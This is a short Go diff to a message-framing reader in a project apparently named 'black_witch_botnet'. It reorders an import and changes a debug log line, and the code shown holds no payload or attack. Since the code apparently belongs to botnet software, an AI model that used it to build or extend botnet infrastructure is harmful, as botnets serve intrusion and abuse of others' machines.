@@ -1,12 +1,12 @@
 package proto
 
 import (
+	"black_witch_botnet/relations"
 	"encoding/binary"
 	"errors"
 	"gopkg.in/mgo.v2/bson"
 	"io"
 	"log"
-	"black_witch_botnet/relations"
 )
 
 const (
@@ -70,8 +70,6 @@ func (r *Reader) Read() (*Package, error) {
 
 	count := size / bufSize
 
-	log.Println("proto read frame count", count)
-
 	for i := uint32(0); i < count; i++ {
 		buf = make([]byte, bufSize)
 		_, err = r.rd.Read(buf)
@@ -84,6 +82,8 @@ func (r *Reader) Read() (*Package, error) {
 	}
 
 	mod := size % bufSize
+
+	log.Printf("proto read frame count %d and last %d", count, mod)
 
 	if mod != 0 {
 		buf = make([]byte, mod)
